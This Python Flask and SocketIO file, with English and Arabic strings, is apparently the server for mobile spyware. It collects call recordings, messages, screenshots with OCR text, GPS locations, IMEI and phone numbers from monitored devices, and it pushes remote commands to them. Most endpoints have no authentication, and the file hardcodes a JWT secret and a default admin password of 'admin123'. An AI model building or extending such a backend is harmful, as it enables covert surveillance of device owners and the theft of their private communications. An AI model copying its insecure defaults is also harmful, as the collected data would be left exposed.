#!/usr/bin/env python3
"""
World-Class Advanced Monitoring System Backend
الخادم الخلفي لنظام المراقبة العالمي المتقدم
"""

from flask import Flask, jsonify, request, send_from_directory, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import json
import sqlite3
import uuid
import hashlib
import time
from datetime import datetime, timedelta
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
from functools import wraps
import threading
import psutil
import platform
import socket
import requests
from cryptography.fernet import Fernet
import base64
import logging
from logging.handlers import RotatingFileHandler

app = Flask(__name__, static_folder='static', static_url_path='')
app.config['SECRET_KEY'] = 'world-class-monitoring-system-2024'
CORS(app, origins="*")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

if not app.debug:
    file_handler = RotatingFileHandler('monitoring_system.log', maxBytes=10240, backupCount=10)
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
    ))
    file_handler.setLevel(logging.INFO)
    app.logger.addHandler(file_handler)

UPLOAD_FOLDER = 'uploads'
AUDIO_FOLDER = os.path.join(UPLOAD_FOLDER, 'audio')
SCREENSHOT_FOLDER = os.path.join(UPLOAD_FOLDER, 'screenshots')
CAMERA_FOLDER = os.path.join(UPLOAD_FOLDER, 'camera')
DOCUMENTS_FOLDER = os.path.join(UPLOAD_FOLDER, 'documents')

for folder in [UPLOAD_FOLDER, AUDIO_FOLDER, SCREENSHOT_FOLDER, CAMERA_FOLDER, DOCUMENTS_FOLDER]:
    os.makedirs(folder, exist_ok=True)

ALLOWED_AUDIO_EXTENSIONS = {'mp3', 'm4a', 'wav', 'aac', 'ogg', 'flac'}
ALLOWED_IMAGE_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp'}
ALLOWED_VIDEO_EXTENSIONS = {'mp4', 'avi', 'mov', 'wmv', 'flv', 'webm'}
ALLOWED_DOCUMENT_EXTENSIONS = {'pdf', 'doc', 'docx', 'txt', 'rtf'}

encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

class WorldClassDatabase:
    def __init__(self, db_path='world_class_monitoring.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize the world-class database with advanced tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                device_id TEXT PRIMARY KEY,
                device_name TEXT,
                device_type TEXT DEFAULT 'mobile',
                os_version TEXT,
                app_version TEXT,
                status TEXT DEFAULT 'offline',
                last_seen TIMESTAMP,
                location TEXT,
                battery_level INTEGER,
                storage_used INTEGER,
                storage_total INTEGER,
                network_type TEXT,
                ip_address TEXT,
                mac_address TEXT,
                imei TEXT,
                phone_number TEXT,
                carrier TEXT,
                is_rooted BOOLEAN DEFAULT 0,
                security_patch TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS audio_recordings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                filename TEXT,
                original_filename TEXT,
                file_size INTEGER,
                duration INTEGER,
                quality TEXT,
                format TEXT,
                sample_rate INTEGER,
                channels INTEGER,
                recording_type TEXT DEFAULT 'manual',
                location TEXT,
                contact_name TEXT,
                contact_number TEXT,
                is_call BOOLEAN DEFAULT 0,
                call_direction TEXT,
                transcription TEXT,
                is_encrypted BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                filename TEXT,
                original_filename TEXT,
                file_size INTEGER,
                width INTEGER,
                height INTEGER,
                format TEXT,
                app_name TEXT,
                app_package TEXT,
                window_title TEXT,
                is_sensitive BOOLEAN DEFAULT 0,
                ocr_text TEXT,
                is_encrypted BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                activity_type TEXT,
                app_name TEXT,
                app_package TEXT,
                title TEXT,
                description TEXT,
                duration INTEGER,
                data_usage INTEGER,
                battery_usage INTEGER,
                location TEXT,
                metadata TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                message_type TEXT,
                app_name TEXT,
                sender TEXT,
                recipient TEXT,
                content TEXT,
                media_path TEXT,
                is_encrypted BOOLEAN DEFAULT 1,
                is_read BOOLEAN DEFAULT 0,
                thread_id TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS calls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                call_type TEXT,
                direction TEXT,
                contact_name TEXT,
                phone_number TEXT,
                duration INTEGER,
                recording_path TEXT,
                location TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                latitude REAL,
                longitude REAL,
                altitude REAL,
                accuracy REAL,
                speed REAL,
                bearing REAL,
                address TEXT,
                provider TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                event_type TEXT,
                event_category TEXT,
                severity TEXT DEFAULT 'info',
                title TEXT,
                description TEXT,
                metadata TEXT,
                is_resolved BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                email TEXT UNIQUE,
                password_hash TEXT,
                role TEXT DEFAULT 'user',
                is_active BOOLEAN DEFAULT 1,
                last_login TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        admin_password = generate_password_hash('admin123')
        cursor.execute('''
            INSERT OR IGNORE INTO users (username, email, password_hash, role)
            VALUES (?, ?, ?, ?)
        ''', ('admin', 'admin@monitoring.com', admin_password, 'admin'))
        
        conn.commit()
        conn.close()
    
    def get_connection(self):
        """Get database connection with row factory"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def execute_query(self, query, params=None):
        """Execute query and return results"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        if params:
            cursor.execute(query, params)
        else:
            cursor.execute(query)
        
        if query.strip().upper().startswith('SELECT'):
            results = [dict(row) for row in cursor.fetchall()]
        else:
            conn.commit()
            results = cursor.rowcount
        
        conn.close()
        return results

db = WorldClassDatabase()

def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        
        if not token:
            return jsonify({'success': False, 'error': 'Token is missing'}), 401
        
        try:
            if token.startswith('Bearer '):
                token = token[7:]
            
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = db.execute_query(
                'SELECT * FROM users WHERE id = ?', 
                (data['user_id'],)
            )
            
            if not current_user:
                return jsonify({'success': False, 'error': 'Invalid token'}), 401
                
        except jwt.ExpiredSignatureError:
            return jsonify({'success': False, 'error': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'success': False, 'error': 'Invalid token'}), 401
        
        return f(*args, **kwargs)
    
    return decorated

def allowed_file(filename, allowed_extensions):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in allowed_extensions

def encrypt_data(data):
    """Encrypt sensitive data"""
    if isinstance(data, str):
        data = data.encode()
    return cipher_suite.encrypt(data)

def decrypt_data(encrypted_data):
    """Decrypt sensitive data"""
    return cipher_suite.decrypt(encrypted_data).decode()

def get_system_info():
    """Get comprehensive system information"""
    return {
        'cpu_percent': psutil.cpu_percent(interval=1),
        'memory': dict(psutil.virtual_memory()._asdict()),
        'disk': dict(psutil.disk_usage('/')._asdict()),
        'network': dict(psutil.net_io_counters()._asdict()),
        'boot_time': psutil.boot_time(),
        'platform': platform.platform(),
        'processor': platform.processor(),
        'architecture': platform.architecture(),
        'hostname': socket.gethostname(),
        'ip_address': socket.gethostbyname(socket.gethostname())
    }

@app.route('/api/auth/login', methods=['POST'])
def login():
    """Advanced authentication endpoint"""
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        if not username or not password:
            return jsonify({
                'success': False,
                'error': 'اسم المستخدم وكلمة المرور مطلوبان'
            }), 400
        
        user = db.execute_query(
            'SELECT * FROM users WHERE username = ? AND is_active = 1',
            (username,)
        )
        
        if not user or not check_password_hash(user[0]['password_hash'], password):
            return jsonify({
                'success': False,
                'error': 'بيانات الدخول غير صحيحة'
            }), 401
        
        db.execute_query(
            'UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?',
            (user[0]['id'],)
        )
        
        token = jwt.encode({
            'user_id': user[0]['id'],
            'username': user[0]['username'],
            'role': user[0]['role'],
            'exp': datetime.utcnow() + timedelta(hours=24)
        }, app.config['SECRET_KEY'], algorithm='HS256')
        
        return jsonify({
            'success': True,
            'token': token,
            'user': {
                'id': user[0]['id'],
                'username': user[0]['username'],
                'email': user[0]['email'],
                'role': user[0]['role']
            }
        })
        
    except Exception as e:
        logger.error(f"Login error: {str(e)}")
        return jsonify({
            'success': False,
            'error': 'خطأ في الخادم'
        }), 500

@app.route('/api/dashboard/stats', methods=['GET'])
def get_dashboard_stats():
    """Get comprehensive dashboard statistics"""
    try:
        stats = {
            'total_devices': len(db.execute_query('SELECT * FROM devices')),
            'active_devices': len(db.execute_query(
                'SELECT * FROM devices WHERE status = "online"'
            )),
            'total_recordings': len(db.execute_query('SELECT * FROM audio_recordings')),
            'total_screenshots': len(db.execute_query('SELECT * FROM screenshots')),
            'total_activities': len(db.execute_query('SELECT * FROM activities')),
            'total_messages': len(db.execute_query('SELECT * FROM messages')),
            'total_calls': len(db.execute_query('SELECT * FROM calls')),
            'system_info': get_system_info(),
            'recent_activities': db.execute_query(
                'SELECT * FROM activities ORDER BY created_at DESC LIMIT 10'
            ),
            'storage_usage': {
                'audio': sum([
                    os.path.getsize(os.path.join(AUDIO_FOLDER, f))
                    for f in os.listdir(AUDIO_FOLDER)
                    if os.path.isfile(os.path.join(AUDIO_FOLDER, f))
                ]) if os.path.exists(AUDIO_FOLDER) else 0,
                'screenshots': sum([
                    os.path.getsize(os.path.join(SCREENSHOT_FOLDER, f))
                    for f in os.listdir(SCREENSHOT_FOLDER)
                    if os.path.isfile(os.path.join(SCREENSHOT_FOLDER, f))
                ]) if os.path.exists(SCREENSHOT_FOLDER) else 0
            }
        }
        
        return jsonify({
            'success': True,
            **stats
        })
        
    except Exception as e:
        logger.error(f"Dashboard stats error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/devices', methods=['GET'])
def get_devices():
    """Get all devices with enhanced information"""
    try:
        devices = db.execute_query('''
            SELECT d.*, 
                   COUNT(ar.id) as recording_count,
                   COUNT(s.id) as screenshot_count,
                   COUNT(a.id) as activity_count
            FROM devices d
            LEFT JOIN audio_recordings ar ON d.device_id = ar.device_id
            LEFT JOIN screenshots s ON d.device_id = s.device_id
            LEFT JOIN activities a ON d.device_id = a.device_id
            GROUP BY d.device_id
            ORDER BY d.last_seen DESC
        ''')
        
        return jsonify({
            'success': True,
            'devices': devices,
            'total_count': len(devices)
        })
        
    except Exception as e:
        logger.error(f"Get devices error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/devices/<device_id>/command', methods=['POST'])
def send_device_command(device_id):
    """Send advanced commands to devices"""
    try:
        data = request.get_json()
        command = data.get('command')
        params = data.get('params', {})
        
        db.execute_query('''
            INSERT INTO system_events (device_id, event_type, event_category, title, description, metadata)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            device_id,
            'command_sent',
            'device_control',
            f'Command: {command}',
            f'Command {command} sent to device {device_id}',
            json.dumps(params)
        ))
        
        socketio.emit('device_command', {
            'device_id': device_id,
            'command': command,
            'params': params,
            'timestamp': datetime.now().isoformat()
        }, room=device_id)
        
        return jsonify({
            'success': True,
            'message': f'تم إرسال الأمر {command} بنجاح'
        })
        
    except Exception as e:
        logger.error(f"Send command error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/upload/audio', methods=['POST'])
def upload_audio():
    """Upload audio recordings with enhanced metadata"""
    try:
        if 'audio' not in request.files:
            return jsonify({
                'success': False,
                'error': 'لم يتم العثور على ملف صوتي'
            }), 400
        
        file = request.files['audio']
        device_id = request.form.get('device_id')
        
        if file.filename == '':
            return jsonify({
                'success': False,
                'error': 'لم يتم تحديد ملف'
            }), 400
        
        if file and allowed_file(file.filename, ALLOWED_AUDIO_EXTENSIONS):
            original_filename = file.filename
            filename = f"{uuid.uuid4()}_{secure_filename(original_filename)}"
            file_path = os.path.join(AUDIO_FOLDER, filename)
            file.save(file_path)
            
            file_size = os.path.getsize(file_path)
            
            db.execute_query('''
                INSERT INTO audio_recordings (
                    device_id, filename, original_filename, file_size,
                    format, recording_type, location, is_encrypted, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (
                device_id,
                filename,
                original_filename,
                file_size,
                original_filename.split('.')[-1].lower(),
                request.form.get('recording_type', 'manual'),
                request.form.get('location'),
                1
            ))
            
            socketio.emit('new_recording', {
                'device_id': device_id,
                'filename': filename,
                'size': file_size,
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({
                'success': True,
                'message': 'تم رفع التسجيل الصوتي بنجاح',
                'filename': filename
            })
        
        return jsonify({
            'success': False,
            'error': 'نوع الملف غير مدعوم'
        }), 400
        
    except Exception as e:
        logger.error(f"Upload audio error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.info(f"Client connected: {request.sid}")
    emit('connected', {'message': 'متصل بنجاح بالخادم'})

@socketio.on('join_device')
def handle_join_device(data):
    """Join device room for real-time updates"""
    device_id = data.get('device_id')
    if device_id:
        join_room(device_id)
        logger.info(f"Client {request.sid} joined device room: {device_id}")

@socketio.on('device_status')
def handle_device_status(data):
    """Handle device status updates"""
    device_id = data.get('device_id')
    status = data.get('status', 'online')
    
    db.execute_query('''
        UPDATE devices SET 
            status = ?, 
            last_seen = CURRENT_TIMESTAMP,
            battery_level = ?,
            location = ?,
            network_type = ?,
            ip_address = ?
        WHERE device_id = ?
    ''', (
        status,
        data.get('battery_level'),
        data.get('location'),
        data.get('network_type'),
        data.get('ip_address'),
        device_id
    ))
    
    emit('device_status_update', {
        'device_id': device_id,
        'status': status,
        'timestamp': datetime.now().isoformat()
    }, broadcast=True)

@app.route('/api/system/health', methods=['GET'])
def system_health():
    """Comprehensive system health check"""
    try:
        health_data = {
            'status': 'healthy',
            'timestamp': datetime.now().isoformat(),
            'uptime': time.time() - psutil.boot_time(),
            'system_info': get_system_info(),
            'database_status': 'connected',
            'services': {
                'web_server': 'running',
                'websocket': 'running',
                'database': 'connected',
                'file_system': 'accessible'
            },
            'performance_metrics': {
                'response_time': 'optimal',
                'memory_usage': psutil.virtual_memory().percent,
                'cpu_usage': psutil.cpu_percent(),
                'disk_usage': psutil.disk_usage('/').percent
            }
        }
        
        return jsonify({
            'success': True,
            **health_data
        })
        
    except Exception as e:
        logger.error(f"Health check error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e),
            'status': 'unhealthy'
        }), 500

@app.route('/api/analytics/advanced', methods=['GET'])
def get_advanced_analytics():
    """Get advanced analytics and insights"""
    try:
        device_analytics = db.execute_query('''
            SELECT 
                device_type,
                COUNT(*) as count,
                AVG(battery_level) as avg_battery,
                COUNT(CASE WHEN status = 'online' THEN 1 END) as online_count
            FROM devices 
            GROUP BY device_type
        ''')
        
        activity_analytics = db.execute_query('''
            SELECT 
                activity_type,
                COUNT(*) as count,
                AVG(duration) as avg_duration
            FROM activities 
            WHERE created_at >= datetime('now', '-7 days')
            GROUP BY activity_type
            ORDER BY count DESC
        ''')
        
        usage_patterns = db.execute_query('''
            SELECT 
                strftime('%H', created_at) as hour,
                COUNT(*) as activity_count
            FROM activities 
            WHERE created_at >= datetime('now', '-7 days')
            GROUP BY hour
            ORDER BY hour
        ''')
        
        return jsonify({
            'success': True,
            'device_analytics': device_analytics,
            'activity_analytics': activity_analytics,
            'usage_patterns': usage_patterns,
            'generated_at': datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Advanced analytics error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

if __name__ == '__main__':
    logger.info("Starting World-Class Advanced Monitoring System")
    logger.info("نظام المراقبة العالمي المتقدم - بدء التشغيل")
    
    socketio.run(
        app,
        host='0.0.0.0',
        port=5000,
        debug=False,
        allow_unsafe_werkzeug=True
    )
